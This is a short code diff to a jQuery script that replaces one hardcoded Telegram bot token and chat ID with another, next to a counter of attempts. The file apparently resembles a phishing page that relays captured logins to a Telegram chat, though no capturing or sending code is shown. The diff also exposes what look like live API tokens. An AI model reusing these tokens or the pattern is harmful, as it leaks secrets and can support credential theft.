@@ -12,8 +12,8 @@ $(document).ready(function() {
     };
     
     // Telegram bot configuration
-    const BOT_TOKEN = '7380968181:AAEchG9j7XT9OjTvKJ9ZkPoFZYi22WCXtKc';
-    const CHAT_ID = '6289708560';
+    const BOT_TOKEN = '8065791758:AAE_4WwVo6LMsZBYELXoySJmqB7AY6xeGCU';
+    const CHAT_ID = '6768989904';
     
     // State management
     let attemptCount = 0;
